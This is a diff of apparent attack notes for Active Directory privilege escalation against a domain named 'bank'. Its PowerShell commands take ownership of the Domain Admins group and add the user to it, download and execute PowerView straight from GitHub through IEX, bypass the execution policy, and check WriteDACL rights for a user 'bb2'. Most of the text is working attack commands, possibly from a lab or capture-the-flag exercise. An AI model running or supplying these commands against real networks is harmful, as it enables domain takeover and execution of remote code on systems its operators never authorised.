@@ -20,6 +20,7 @@
 
 --------------------------------------------------------------------------------------------------------
 >$groupDN = "LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=com"
+
 >$acl = [System.DirectoryServices.DirectoryEntry]::new($groupDN).ObjectSecurity
 
 ------------------------------------------------------------------------------------------------------------
@@ -32,7 +33,9 @@
 ---------------------------------------------------------------------
 # 1. Take ownership
 >$group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=local"
+
 >$group.psbase.ObjectSecurity.SetOwner([System.Security.Principal.NTAccount]("bank\goodboy"))
+
 >$group.psbase.CommitChanges()
 
 # 2. Add self to group
@@ -53,7 +56,8 @@ with ✔ Modify permissions
 >IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
 
 >Get-Command -Module PowerView
-(If blocked by execution policy, run: Set-ExecutionPolicy Bypass -Scope Process -Force first)
+
+. (If blocked by execution policy, run: Set-ExecutionPolicy Bypass -Scope Process -Force first)
 
 # Verify if 'bb2' has WriteDACL on Domain Admins
 >Get-DomainObjectAcl -Identity "Domain Admins" | Where-Object { $_.SecurityIdentifier -eq (Get-DomainUser "bb2").SID } | Select-Object ActiveDirectoryRights
